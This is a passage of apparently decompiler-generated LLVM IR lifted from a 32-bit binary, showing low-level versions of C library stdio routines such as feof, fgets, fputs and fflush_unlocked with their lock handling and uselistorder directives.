  uselistorder i32 %v1_80522cf, { 0, 2, 1 }
  uselistorder i32 %v2_80522af, { 1, 2, 0 }
  uselistorder i32 %v1_80522a1, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052282, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8052275, { 1, 0 }
  uselistorder i32 %v5_805226f, { 1, 2, 0 }
  uselistorder i32 %v0_8052282, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8052250, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8052266, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_80521e1, { 1, 2, 0 }
  uselistorder i32 %v1_80521b7, { 1, 2, 0 }
  uselistorder i32 %v0_80521e1, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805217d, { 1, 0 }
  uselistorder i32 %v1_805216a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8052173, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_805215d, { 0, 2, 3, 1 }
  uselistorder i32 %v6_8052153, { 1, 0 }
  uselistorder i32 %v1_8052135, { 1, 0 }
  uselistorder i32 %v0_8052153.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8052118, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805210f, { 1, 2, 0 }
  uselistorder i32 %v0_80520d5, { 1, 0 }
  uselistorder i32 %v1_80520c7, { 1, 0 }
  uselistorder i32 %v1_80520c2, { 0, 1, 3, 2 }
  uselistorder i32 %v6_80520c0, { 2, 0, 1 }
  uselistorder i32 %v0_80520e2, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_805207d, { 1, 2, 0 }
  uselistorder i32 %v0_8052055, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_805204b, { 1, 2, 0 }
  uselistorder i32 %v6_8052049, { 0, 2, 1 }
  uselistorder i32 %v0_8052048, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_8052041, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_8052041, { 2, 1, 0 }
  uselistorder i32 %v1_8052039, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_805201f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051ff5, { 0, 2, 1 }
  uselistorder i32 %v0_8051fe2, { 2, 0, 1 }
  uselistorder i32 %v4_8051f7c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134585611, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8059d15.478 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8052340, { 1, 0 }
  uselistorder label %dec_label_pc_805233d, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052331, { 1, 0 }
  uselistorder label %dec_label_pc_8052306, { 1, 0 }
  uselistorder label %dec_label_pc_80522cb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805226f, { 1, 0 }
  uselistorder label %dec_label_pc_8052243, { 1, 0 }
  uselistorder label %dec_label_pc_80521ab, { 1, 0 }
  uselistorder label %dec_label_pc_8052177, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805214e, { 1, 0 }
  uselistorder label %dec_label_pc_8052125, { 1, 0 }
  uselistorder label %dec_label_pc_80520ec, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805208f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052049, { 1, 0 }
  uselistorder label %dec_label_pc_8052048, { 1, 0 }
  uselistorder label %dec_label_pc_805202f, { 1, 0 }
  uselistorder label %dec_label_pc_8052018, { 1, 0 }
  uselistorder label %dec_label_pc_8052018.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_805234b = ptrtoint i32* %stack_var_-28 to i32
  %v4_805234e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805234e, i32* %esi.global-to-local, align 4
  %v1_8052352 = add i32 %v4_805234e, 52
  %v2_8052352 = inttoptr i32 %v1_8052352 to i32*
  %v3_8052352 = load i32, i32* %v2_8052352, align 4
  %v1_8052355 = icmp eq i32 %v3_8052352, 0
  %v1_8052357 = icmp eq i1 %v1_8052355, false
  br i1 %v1_8052357, label %dec_label_pc_8052378, label %dec_label_pc_8052359

dec_label_pc_8052359:                             ; preds = %entry
  %v1_8052359 = add i32 %v4_805234e, 56
  store i32 %v1_8052359, i32* %ebx.global-to-local, align 4
  store i32 %v12_805234b, i32* @eax, align 4
  %v2_8052368 = call i32 @__pthread_return_void(i32 %v12_805234b, i32 134565087)
  %v1_8052370 = call i32 @__pthread_return_0(i32 %v1_8052359)
  %v0_805237a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052378

dec_label_pc_8052378:                             ; preds = %entry, %dec_label_pc_8052359
  %v0_805237a = phi i32 [ %v4_805234e, %entry ], [ %v0_805237a.pre, %dec_label_pc_8052359 ]
  %v1_805237a = inttoptr i32 %v0_805237a to i16*
  %v2_805237a = load i16, i16* %v1_805237a, align 2
  %v3_805237a = zext i16 %v2_805237a to i32
  store i32 %v3_805237a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8052357, label %dec_label_pc_8052390, label %dec_label_pc_805237f

dec_label_pc_805237f:                             ; preds = %dec_label_pc_8052378
  store i32 %v12_805234b, i32* @eax, align 4
  %v2_8052388 = call i32 @__pthread_return_void(i32 %v12_805234b, i32 1)
  %v0_8052393.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052390

dec_label_pc_8052390:                             ; preds = %dec_label_pc_8052378, %dec_label_pc_805237f
  %v0_8052393 = phi i32 [ %v3_805237a, %dec_label_pc_8052378 ], [ %v0_8052393.pre, %dec_label_pc_805237f ]
  %v1_8052393 = and i32 %v0_8052393, 4
  ret i32 %v1_8052393

; uselistorder directives
  uselistorder i32 %v12_805234b, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8052390, { 1, 0 }
  uselistorder label %dec_label_pc_8052378, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805239c = load i32, i32* @edi, align 4
  %v0_805239d = load i32, i32* @esi, align 4
  %v0_805239e = load i32, i32* @ebx, align 4
  %v12_805239f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_80523a6 = add i32 %arg3, 52
  %v2_80523a6 = inttoptr i32 %v1_80523a6 to i32*
  %v3_80523a6 = load i32, i32* %v2_80523a6, align 4
  store i32 %v3_80523a6, i32* @edi, align 4
  %v1_80523a9 = icmp eq i32 %v3_80523a6, 0
  %v1_80523ab = icmp eq i1 %v1_80523a9, false
  br i1 %v1_80523ab, label %entry.dec_label_pc_80523cc_crit_edge, label %dec_label_pc_80523ad

entry.dec_label_pc_80523cc_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80523cc

dec_label_pc_80523ad:                             ; preds = %entry
  %v1_80523ad = add i32 %arg3, 56
  store i32 %v1_80523ad, i32* @ebx, align 4
  store i32 %v12_805239f, i32* @eax, align 4
  %v2_80523bc = call i32 @__pthread_return_void(i32 %v12_805239f, i32 134565087)
  %v0_80523c1 = load i32, i32* @ebx, align 4
  %v1_80523c4 = call i32 @__pthread_return_0(i32 %v0_80523c1)
  %v0_80523cd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80523cc

dec_label_pc_80523cc:                             ; preds = %entry.dec_label_pc_80523cc_crit_edge, %dec_label_pc_80523ad
  %v0_80523cd = phi i32 [ %arg3, %entry.dec_label_pc_80523cc_crit_edge ], [ %v0_80523cd.pre, %dec_label_pc_80523ad ]
  %v0_80523cc = load i32, i32* @edx, align 4
  %v4_80523d6 = inttoptr i32 %arg1 to i8*
  %v5_80523d6 = call i32 @__GI_fgets_unlocked(i8* %v4_80523d6, i32 %arg2, i32 %v0_80523cd, i32 %v0_80523cc)
  store i32 %v5_80523d6, i32* %ebx.global-to-local, align 4
  br i1 %v1_80523ab, label %dec_label_pc_80523f5, label %dec_label_pc_80523e4

dec_label_pc_80523e4:                             ; preds = %dec_label_pc_80523cc
  store i32 %v12_805239f, i32* @eax, align 4
  %v2_80523ed = call i32 @__pthread_return_void(i32 %v12_805239f, i32 1)
  %v0_80523f8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80523f5

dec_label_pc_80523f5:                             ; preds = %dec_label_pc_80523cc, %dec_label_pc_80523e4
  %v0_80523f8 = phi i32 [ %v5_80523d6, %dec_label_pc_80523cc ], [ %v0_80523f8.pre, %dec_label_pc_80523e4 ]
  store i32 %v0_805239e, i32* @ebx, align 4
  store i32 %v0_805239d, i32* @esi, align 4
  store i32 %v0_805239c, i32* @edi, align 4
  ret i32 %v0_80523f8

; uselistorder directives
  uselistorder i32 %v12_805239f, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80523f5, { 1, 0 }
  uselistorder label %dec_label_pc_80523cc, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8052400 = load i32, i32* @edi, align 4
  %v0_8052401 = load i32, i32* @esi, align 4
  %v0_8052402 = load i32, i32* @ebx, align 4
  %v12_8052403 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_805240a = add i32 %arg2, 52
  %v2_805240a = inttoptr i32 %v1_805240a to i32*
  %v3_805240a = load i32, i32* %v2_805240a, align 4
  store i32 %v3_805240a, i32* @edi, align 4
  %v1_805240d = icmp eq i32 %v3_805240a, 0
  %v1_805240f = icmp eq i1 %v1_805240d, false
  br i1 %v1_805240f, label %entry.dec_label_pc_8052430_crit_edge, label %dec_label_pc_8052411

entry.dec_label_pc_8052430_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8052430

dec_label_pc_8052411:                             ; preds = %entry
  %v1_8052411 = add i32 %arg2, 56
  store i32 %v1_8052411, i32* @ebx, align 4
  store i32 %v12_8052403, i32* @eax, align 4
  %v2_8052420 = call i32 @__pthread_return_void(i32 %v12_8052403, i32 134565087)
  %v0_8052425 = load i32, i32* @ebx, align 4
  %v1_8052428 = call i32 @__pthread_return_0(i32 %v0_8052425)
  %v0_8052432.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052430

dec_label_pc_8052430:                             ; preds = %entry.dec_label_pc_8052430_crit_edge, %dec_label_pc_8052411
  %v0_8052432 = phi i32 [ %arg2, %entry.dec_label_pc_8052430_crit_edge ], [ %v0_8052432.pre, %dec_label_pc_8052411 ]
  %v0_8052430 = load i32, i32* @edx, align 4
  %v4_8052437 = inttoptr i32 %arg1 to i8*
  %v5_8052437 = call i32 @__GI_fputs_unlocked(i8* %v4_8052437, i32 %v0_8052432, i32 %v0_8052430, i32 %v0_8052430)
  store i32 %v5_8052437, i32* %ebx.global-to-local, align 4
  br i1 %v1_805240f, label %dec_label_pc_8052456, label %dec_label_pc_8052445

dec_label_pc_8052445:                             ; preds = %dec_label_pc_8052430
  store i32 %v12_8052403, i32* @eax, align 4
  %v2_805244e = call i32 @__pthread_return_void(i32 %v12_8052403, i32 1)
  %v0_8052459.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052456

dec_label_pc_8052456:                             ; preds = %dec_label_pc_8052430, %dec_label_pc_8052445
  %v0_8052459 = phi i32 [ %v5_8052437, %dec_label_pc_8052430 ], [ %v0_8052459.pre, %dec_label_pc_8052445 ]
  store i32 %v0_8052402, i32* @ebx, align 4
  store i32 %v0_8052401, i32* @esi, align 4
  store i32 %v0_8052400, i32* @edi, align 4
  ret i32 %v0_8052459

; uselistorder directives
  uselistorder i32 %v12_8052403, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052456, { 1, 0 }
  uselistorder label %dec_label_pc_8052430, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_805246f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805246f, i32* @eax, align 4
  %v2_8052474 = call i32 @__pthread_return_void(i32 %v2_805246f, i32 134565087)
  %v1_8052480 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  %v0_8052485 = load i32, i32* @global_var_805f564.465, align 4
  %v8_805248d = icmp eq i32 %v0_8052485, 1
  %v1_805248e = icmp eq i1 %v8_805248d, false
  br i1 %v1_805248e, label %dec_label_pc_8052525, label %dec_label_pc_8052494

dec_label_pc_8052494:                             ; preds = %entry
  %v0_8052494 = load i32, i32* @global_var_805f568.466, align 8
  %tmp29 = icmp slt i32 %v0_8052494, 1
  br i1 %tmp29, label %dec_label_pc_8052525, label %dec_label_pc_80524a1

dec_label_pc_80524a1:                             ; preds = %dec_label_pc_8052494
  store i32 0, i32* @esi, align 4
  %v2_80524ae = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_80524ae, i32* @eax, align 4
  %v2_80524b3 = call i32 @__pthread_return_void(i32 %v2_80524ae, i32 134565087)
  %v1_80524bf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  %v0_80524c4 = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  store i32 %v0_80524c4, i32* %edx.global-to-local, align 4
  %v1_80525063 = icmp eq i32 %v0_80524c4, 0
  %v1_805250810 = icmp eq i1 %v1_80525063, false
  br i1 %v1_805250810, label %dec_label_pc_80524cf, label %dec_label_pc_805250a

dec_label_pc_80524cf:                             ; preds = %dec_label_pc_80524a1, %dec_label_pc_8052504
  %v1_80524cf14.in = phi i32 [ %v0_8052504, %dec_label_pc_8052504 ], [ %v0_80524c4, %dec_label_pc_80524a1 ]
  %v1_80524cf14 = inttoptr i32 %v1_80524cf14.in to i16*
  %v2_80524cf = load i16, i16* %v1_80524cf14, align 2
  %v1_80524d2 = add i32 %v1_80524cf14.in, 32
  %v2_80524d2 = inttoptr i32 %v1_80524d2 to i32*
  %v3_80524d2 = load i32, i32* %v2_80524d2, align 4
  store i32 %v3_80524d2, i32* @ebx, align 4
  %v1_80524d5 = and i16 %v2_80524cf, -32720
  %v6_80524da = icmp eq i16 %v1_80524d5, 48
  br i1 %v6_80524da, label %dec_label_pc_80524e3, label %dec_label_pc_80524df

dec_label_pc_80524df:                             ; preds = %dec_label_pc_80524cf
  store i32 %v1_80524cf14.in, i32* @esi, align 4
  br label %dec_label_pc_8052504

dec_label_pc_80524e3:                             ; preds = %dec_label_pc_80524cf
  %v0_80524e3 = load i32, i32* @esi, align 4
  %v1_80524e3 = icmp eq i32 %v0_80524e3, 0
  %v1_80524e5 = icmp eq i1 %v1_80524e3, false
  br i1 %v1_80524e5, label %dec_label_pc_80524ef, label %dec_label_pc_80524e7

dec_label_pc_80524e7:                             ; preds = %dec_label_pc_80524e3
  store i32 %v3_80524d2, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  br label %dec_label_pc_80524f2

dec_label_pc_80524ef:                             ; preds = %dec_label_pc_80524e3
  %v2_80524ef = add i32 %v0_80524e3, 32
  %v3_80524ef = inttoptr i32 %v2_80524ef to i32*
  store i32 %v3_80524d2, i32* %v3_80524ef, align 4
  %v0_80524f2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80524f2

dec_label_pc_80524f2:                             ; preds = %dec_label_pc_80524e7, %dec_label_pc_80524ef
  %v0_80524fb = phi i32 [ %v1_80524cf14.in, %dec_label_pc_80524e7 ], [ %v0_80524f2.pre, %dec_label_pc_80524ef ]
  %v1_80524f2 = add i32 %v0_80524fb, 1
  %v2_80524f2 = inttoptr i32 %v1_80524f2 to i8*
  %v3_80524f2 = load i8, i8* %v2_80524f2, align 1
  %v4_80524f2 = and i8 %v3_80524f2, 32
  %v5_80524f2 = icmp eq i8 %v4_80524f2, 0
  br i1 %v5_80524f2, label %dec_label_pc_8052504, label %dec_label_pc_80524f8

dec_label_pc_80524f8:                             ; preds = %dec_label_pc_80524f2
  %v1_80524fc = call i32 @free(i32 %v0_80524fb)
  br label %dec_label_pc_8052504

dec_label_pc_8052504:                             ; preds = %dec_label_pc_80524f2, %dec_label_pc_80524df, %dec_label_pc_80524f8
  %v0_8052504 = load i32, i32* @ebx, align 4
  store i32 %v0_8052504, i32* %edx.global-to-local, align 4
  %v1_8052506 = icmp eq i32 %v0_8052504, 0
  %v1_8052508 = icmp eq i1 %v1_8052506, false
  br i1 %v1_8052508, label %dec_label_pc_80524cf, label %dec_label_pc_805250a

dec_label_pc_805250a:                             ; preds = %dec_label_pc_8052504, %dec_label_pc_80524a1
  store i32 %v2_80524ae, i32* @eax, align 4
  %v2_8052513 = call i32 @__pthread_return_void(i32 %v2_80524ae, i32 1)
  store i32 0, i32* @global_var_805f568.466, align 8
  %v0_8052525.pre = load i32, i32* @global_var_805f564.465, align 4
  br label %dec_label_pc_8052525

dec_label_pc_8052525:                             ; preds = %dec_label_pc_8052494, %entry, %dec_label_pc_805250a
  %v0_8052525 = phi i32 [ %v0_8052485, %dec_label_pc_8052494 ], [ %v0_8052485, %entry ], [ %v0_8052525.pre, %dec_label_pc_805250a ]
  %v1_805252a = add i32 %v0_8052525, -1
  store i32 %v1_805252a, i32* @global_var_805f564.465, align 4
  store i32 %v2_805246f, i32* @eax, align 4
  %v2_8052539 = call i32 @__pthread_return_void(i32 %v2_805246f, i32 1)
  ret i32 %v2_8052539

; uselistorder directives
  uselistorder i32 %v0_8052504, { 1, 2, 0 }
  uselistorder i32 %v1_80524cf14.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8052485, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052525, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052504, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80524f2, { 1, 0 }
  uselistorder label %dec_label_pc_80524cf, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8052544 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_8052547 = load i32, i32* @edi, align 4
  %v0_8052548 = load i32, i32* @esi, align 4
  %v0_8052549 = load i32, i32* @ebx, align 4
  %v4_805254d = ptrtoint i16* %arg1 to i32
  store i32 %v4_805254d, i32* @ebx, align 4
  %v10_8052551 = icmp eq i16* %arg1, inttoptr (i32 134591160 to i16*)
  br i1 %v10_8052551, label %dec_label_pc_8052565, label %dec_label_pc_8052559

dec_label_pc_8052559:                             ; preds = %entry
  %v2_8052559 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_805255f = icmp eq i1 %v2_8052559, false
  br i1 %v1_805255f, label %dec_label_pc_805265d, label %dec_label_pc_8052565

dec_label_pc_8052565:                             ; preds = %dec_label_pc_8052559, %entry
  store i32 0, i32* @edi, align 4
  %v2_8052572 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052572, i32* @ebx, align 4
  %v2_8052577 = call i32 @__pthread_return_void(i32 %v2_8052572, i32 134565087)
  %v1_8052583 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  %v0_8052588 = load i32, i32* @global_var_805f564.465, align 4
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* @ecx, align 4
  %v1_805258f = add i32 %v0_8052588, 1
  store i32 %v1_805258f, i32* @eax, align 4
  store i32 %v1_805258f, i32* @global_var_805f564.465, align 4
  %v2_8052598 = call i32 @__pthread_return_void(i32 %v2_8052572, i32 1)
  store i32 %v2_8052598, i32* @eax, align 4
  %v2_80525ab = call i32 @__pthread_return_void(i32 %v2_8052572, i32 134565087)
  %v1_80525b7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  %v0_80525bc = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  store i32 %v0_80525bc, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805b2bc.468 to i32), i32* @eax, align 4
  %v2_80525c7 = call i32 @__pthread_return_void(i32 %v2_8052572, i32 1)
  %v0_805264e1 = load i32, i32* @esi, align 4
  %v1_805264e2 = icmp eq i32 %v0_805264e1, 0
  %v1_80526509 = icmp eq i1 %v1_805264e2, false
  br i1 %v1_80526509, label %dec_label_pc_80525d1, label %dec_label_pc_8052656

dec_label_pc_80525d1:                             ; preds = %dec_label_pc_8052565, %dec_label_pc_805264b
  %v0_80525df = phi i32 [ %v3_805264b, %dec_label_pc_805264b ], [ %v0_805264e1, %dec_label_pc_8052565 ]
  %v1_80525d1 = inttoptr i32 %v0_80525df to i8*
  %v2_80525d1 = load i8, i8* %v1_80525d1, align 1
  %v3_80525d1 = and i8 %v2_80525d1, 64
  %v4_80525d1 = icmp eq i8 %v3_80525d1, 0
  br i1 %v4_80525d1, label %dec_label_pc_805264b, label %dec_label_pc_80525d6

dec_label_pc_80525d6:                             ; preds = %dec_label_pc_80525d1
  %v0_80525d6 = load i32, i32* @global_var_805b2ec.467, align 4
  %v9_80525d6 = icmp eq i32 %v0_80525d6, 2
  br i1 %v9_80525d6, label %dec_label_pc_80525fe, label %dec_label_pc_80525df

dec_label_pc_80525df:                             ; preds = %dec_label_pc_80525d6
  %v1_80525df = add i32 %v0_80525df, 56
  store i32 %v1_80525df, i32* @ebx, align 4
  store i32 %v2_8052572, i32* @eax, align 4
  %v2_80525ee = call i32 @__pthread_return_void(i32 %v2_8052572, i32 134565087)
  %v0_80525f3 = load i32, i32* @ebx, align 4
  %v1_80525f6 = call i32 @__pthread_return_0(i32 %v0_80525f3)
  %v0_80525fe.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80525fe

dec_label_pc_80525fe:                             ; preds = %dec_label_pc_80525d6, %dec_label_pc_80525df
  %v0_8052611 = phi i32 [ %v0_80525df, %dec_label_pc_80525d6 ], [ %v0_80525fe.pre, %dec_label_pc_80525df ]
  %v1_80525fe = inttoptr i32 %v0_8052611 to i32*
  %v2_80525fe = load i32, i32* %v1_80525fe, align 4
  %v1_8052600 = load i32, i32* @ebp, align 4
  %v2_8052600 = or i32 %v1_8052600, %v2_80525fe
  %v1_8052602 = and i32 %v2_8052600, 832
  %v2_8052607 = icmp eq i32 %v1_8052602, 320
  %v1_805260c = icmp eq i1 %v2_8052607, false
  br i1 %v1_805260c, label %dec_label_pc_8052631, label %dec_label_pc_805260e

dec_label_pc_805260e:                             ; preds = %dec_label_pc_80525fe
  %v1_8052612 = call i32 @__stdio_wcommit(i32 %v0_8052611)
  %v1_805261a = icmp eq i32 %v1_8052612, 0
  br i1 %v1_805261a, label %dec_label_pc_8052623, label %dec_label_pc_805261e

dec_label_pc_805261e:                             ; preds = %dec_label_pc_805260e
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8052631

dec_label_pc_8052623:                             ; preds = %dec_label_pc_805260e
  %v0_8052623 = load i32, i32* @esi, align 4
  %v1_8052623 = add i32 %v0_8052623, 8
  %v2_8052623 = inttoptr i32 %v1_8052623 to i32*
  %v3_8052623 = load i32, i32* %v2_8052623, align 4
  %v2_8052626 = add i32 %v0_8052623, 28
  %v3_8052626 = inttoptr i32 %v2_8052626 to i32*
  store i32 %v3_8052623, i32* %v3_8052626, align 4
  %v0_8052629 = load i32, i32* @esi, align 4
  %v1_8052629 = inttoptr i32 %v0_8052629 to i32*
  %v2_8052629 = load i32, i32* %v1_8052629, align 4
  %v2_8052629.tr = trunc i32 %v2_8052629 to i16
  %v1_805262e = and i16 %v2_8052629.tr, -65
  %v3_805262e = inttoptr i32 %v0_8052629 to i16*
  store i16 %v1_805262e, i16* %v3_805262e, align 2
  br label %dec_label_pc_8052631

dec_label_pc_8052631:                             ; preds = %dec_label_pc_80525fe, %dec_label_pc_805261e, %dec_label_pc_8052623
  %v0_8052631 = load i32, i32* @global_var_805b2ec.467, align 4
  %v9_8052631 = icmp eq i32 %v0_8052631, 2
  br i1 %v9_8052631, label %dec_label_pc_805264b, label %dec_label_pc_805263a

dec_label_pc_805263a:                             ; preds = %dec_label_pc_8052631
  store i32 %v2_8052572, i32* @eax, align 4
  %v2_8052643 = call i32 @__pthread_return_void(i32 %v2_8052572, i32 1)
  br label %dec_label_pc_805264b

dec_label_pc_805264b:                             ; preds = %dec_label_pc_8052631, %dec_label_pc_80525d1, %dec_label_pc_805263a
  %v0_805264b = load i32, i32* @esi, align 4
  %v1_805264b = add i32 %v0_805264b, 32
  %v2_805264b = inttoptr i32 %v1_805264b to i32*
  %v3_805264b = load i32, i32* %v2_805264b, align 4
  store i32 %v3_805264b, i32* @esi, align 4
  %v1_805264e = icmp eq i32 %v3_805264b, 0
  %v1_8052650 = icmp eq i1 %v1_805264e, false
  br i1 %v1_8052650, label %dec_label_pc_80525d1, label %dec_label_pc_8052656

dec_label_pc_8052656:                             ; preds = %dec_label_pc_805264b, %dec_label_pc_8052565
  %v0_8052656 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8052687

dec_label_pc_805265d:                             ; preds = %dec_label_pc_8052559
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_805265f = load i8, i8* %tmp23, align 1
  %v4_805265f = and i8 %v3_805265f, 64
  %v5_805265f = icmp eq i8 %v4_805265f, 0
  br i1 %v5_805265f, label %dec_label_pc_8052687, label %dec_label_pc_8052664

dec_label_pc_8052664:                             ; preds = %dec_label_pc_805265d
  store i32 -1, i32* @edi, align 4
  %v1_805266b = call i32 @__stdio_wcommit(i32 %v4_805254d)
  %v1_8052673 = icmp eq i32 %v1_805266b, 0
  %v1_8052675 = icmp eq i1 %v1_8052673, false
  br i1 %v1_8052675, label %dec_label_pc_8052687, label %dec_label_pc_8052677

dec_label_pc_8052677:                             ; preds = %dec_label_pc_8052664
  %v2_8052677 = add i32 %v4_805254d, 8
  %v3_8052677 = inttoptr i32 %v2_8052677 to i32*
  %v4_8052677 = load i32, i32* %v3_8052677, align 4
  store i32 0, i32* @edi, align 4
  %v3_805267c = add i32 %v4_805254d, 28
  %v4_805267c = inttoptr i32 %v3_805267c to i32*
  store i32 %v4_8052677, i32* %v4_805267c, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_805267f = load i32, i32* %tmp24, align 4
  %v3_805267f.tr = trunc i32 %v3_805267f to i16
  %v1_8052684 = and i16 %v3_805267f.tr, -65
  store i16 %v1_8052684, i16* %arg1, align 2
  br label %dec_label_pc_8052687

dec_label_pc_8052687:                             ; preds = %dec_label_pc_8052664, %dec_label_pc_805265d, %dec_label_pc_8052656, %dec_label_pc_8052677
  %v0_805268a = load i32, i32* @edi, align 4
  store i32 %v0_8052549, i32* @ebx, align 4
  store i32 %v0_8052548, i32* @esi, align 4
  store i32 %v0_8052547, i32* @edi, align 4
  store i32 %v0_8052544, i32* @ebp, align 4
  ret i32 %v0_805268a

; uselistorder directives
  uselistorder i32 %v3_805264b, { 1, 2, 0 }
  uselistorder i32 %v2_8052572, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_805b2b8.469 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805f564.465, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_8052687, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805264b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052631, { 2, 1, 0 }
